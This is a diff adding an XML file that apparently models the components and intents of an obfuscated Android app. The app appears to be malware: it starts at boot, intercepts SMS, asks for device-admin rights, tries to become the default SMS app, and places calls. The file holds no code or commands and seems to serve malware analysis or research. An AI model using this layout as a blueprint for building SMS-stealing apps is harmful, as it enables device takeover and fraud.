@@ -1,0 +1,85 @@
+<?xml version="1.0" encoding="UTF-8"?>
+
+<root>
+  <component name="ssxodv.jdipue.wltter.AlarmReceiverSmsMan" type="Receiver">
+    <sender destination="interICC_android.provider.Telephony.ACTION_CHANGE_DEFAULT, " action="android.provider.Telephony.ACTION_CHANGE_DEFAULT" flags="FLAG_ACTIVITY_NEW_TASK " extras="String-package"/>
+  </component>
+  <component name="ssxodv.jdipue.wltter.MmsReceiver" type="Receiver" permission="android.permission.BROADCAST_WAP_PUSH">
+    <manifest>
+      <intent_filter action="android.provider.Telephony.WAP_PUSH_DELIVER"/>
+    </manifest>
+  </component>
+  <component name="ssxodv.jdipue.wltter.ActivityCard" type="Activity">
+    <sender destination="interICC_android.intent.action.CALL, , interICC_android.intent.action.VIEW, "/>
+  </component>
+  <component name="ssxodv.jdipue.wltter.SrvKlog" type="Service"/>
+  <component name="ssxodv.jdipue.wltter.AlarmReceiverAdm" type="Receiver">
+    <sender destination="ssxodv.jdipue.wltter.MAC" flags="FLAG_ACTIVITY_NEW_TASK "/>
+  </component>
+  <component name="ssxodv.jdipue.wltter.Activity1" type="Activity">
+    <manifest>
+      <intent_filter action="android.intent.action.MAIN" category="android.intent.category.LAUNCHER"/>
+    </manifest>
+    <sender destination="ssxodv.jdipue.wltter.AlarmReceiverSmsMan, ssxodv.jdipue.wltter.AlarmReceiverAdm, ssxodv.jdipue.wltter.SrvKlog, ssxodv.jdipue.wltter.SrvProcMon, ssxodv.jdipue.wltter.AlarmReceiverKnock, ssxodv.jdipue.wltter.SrvKnock, ssxodv.jdipue.wltter.SrvAdm, ssxodv.jdipue.wltter.ActivityMMS" flags="FLAG_ACTIVITY_NEW_TASK "/>
+  </component>
+  <component name="ssxodv.jdipue.wltter.SrvProcMon" type="Service"/>
+  <component name="ssxodv.jdipue.wltter.AlarmReceiverKnock" type="Receiver">
+    <sender destination="interICC_android.intent.action.CALL, , interICC_android.intent.action.VIEW, " action="android.intent.action.VIEW, android.intent.action.CALL" type="" flags="FLAG_ACTIVITY_NEW_TASK "/>
+  </component>
+  <component name="ssxodv.jdipue.wltter.SrvKnock" type="Service"/>
+  <component name="ssxodv.jdipue.wltter.ActivityWeb" type="Activity"/>
+  <component name="ssxodv.jdipue.wltter.SrvAdm" type="Service"/>
+  <component name="ssxodv.jdipue.wltter.ActivityMMS" type="Activity"/>
+  <component name="ssxodv.jdipue.wltter.IMMon" type="Receiver">
+    <manifest>
+      <intent_filter action="android.provider.Telephony.SMS_RECEIVED"/>
+    </manifest>
+    <sender destination="ssxodv.jdipue.wltter.IMService" extras="Serializable-,String-"/>
+  </component>
+  <component name="ssxodv.jdipue.wltter.ComposeSmsActivity" type="Activity">
+    <manifest>
+      <intent_filter action="android.intent.action.SENDTO, android.intent.action.SEND" category="android.intent.category.BROWSABLE, android.intent.category.DEFAULT" scheme="smsto"/>
+    </manifest>
+  </component>
+  <component name="ssxodv.jdipue.wltter.BootReciv" type="Receiver">
+    <manifest>
+      <intent_filter action="android.intent.action.BOOT_COMPLETED, android.intent.action.QUICKBOOT_POWERON"/>
+    </manifest>
+    <sender destination="ssxodv.jdipue.wltter.AlarmReceiverSmsMan, ssxodv.jdipue.wltter.SrvKlog, ssxodv.jdipue.wltter.AlarmReceiverAdm, ssxodv.jdipue.wltter.SrvProcMon, ssxodv.jdipue.wltter.AlarmReceiverKnock, ssxodv.jdipue.wltter.SrvKnock, ssxodv.jdipue.wltter.SrvAdm"/>
+  </component>
+  <component name="ssxodv.jdipue.wltter.IntentReceiver" type="Receiver">
+    <manifest>
+      <intent_filter action="android.intent.action.PACKAGE_ADDED, android.intent.action.PACKAGE_REMOVED, android.net.conn.CONNECTIVITY_CHANGE, android.intent.action.SCREEN_ON, android.intent.action.DREAMING_STOPPED" scheme="package"/>
+    </manifest>
+    <sender destination="ssxodv.jdipue.wltter.AlarmReceiverKnock, ssxodv.jdipue.wltter.SrvKnock"/>
+  </component>
+  <component name="ssxodv.jdipue.wltter.MAC" type="Activity">
+    <sender destination="interICC_android.app.action.ADD_DEVICE_ADMIN, " action="android.app.action.ADD_DEVICE_ADMIN" extras="String-android.app.extra.ADD_EXPLANATION,Parcelable-android.app.extra.DEVICE_ADMIN"/>
+  </component>
+  <component name="ssxodv.jdipue.wltter.SmsReceiver" type="Receiver" permission="android.permission.BROADCAST_SMS">
+    <manifest>
+      <intent_filter action="android.provider.Telephony.SMS_DELIVER"/>
+    </manifest>
+    <sender destination="ssxodv.jdipue.wltter.IMService" extras="String-"/>
+  </component>
+  <component name="ssxodv.jdipue.wltter.CAdm" type="Receiver" permission="android.permission.BIND_DEVICE_ADMIN">
+    <manifest>
+      <intent_filter action="android.app.action.DEVICE_ADMIN_ENABLED"/>
+    </manifest>
+  </component>
+  <component name="ssxodv.jdipue.wltter.rNetworkStatus" type="Receiver">
+    <manifest>
+      <intent_filter action="android.net.wifi.WIFI_STATE_CHANGED, android.net.conn.CONNECTIVITY_CHANGE"/>
+    </manifest>
+    <sender destination="ssxodv.jdipue.wltter.AlarmReceiverSmsMan, ssxodv.jdipue.wltter.AlarmReceiverAdm, ssxodv.jdipue.wltter.AlarmReceiverKnock, ssxodv.jdipue.wltter.SrvKnock, ssxodv.jdipue.wltter.SrvAdm"/>
+  </component>
+  <component name="ssxodv.jdipue.wltter.HeadlessSmsSendService" type="Service" exported="true" permission="android.permission.SEND_RESPOND_VIA_MESSAGE">
+    <manifest>
+      <intent_filter action="android.intent.action.RESPOND_VIA_MESSAGE" category="android.intent.category.DEFAULT" scheme="smsto"/>
+    </manifest>
+  </component>
+  <component name="ssxodv.jdipue.wltter.IMService" type="Service">
+    <sender destination="interICC_android.intent.action.CALL, , interICC_android.intent.action.VIEW, " action="android.intent.action.VIEW, android.intent.action.CALL" type="" flags="FLAG_ACTIVITY_NEW_TASK "/>
+    <receive extras="String-"/>
+  </component>
+</root>
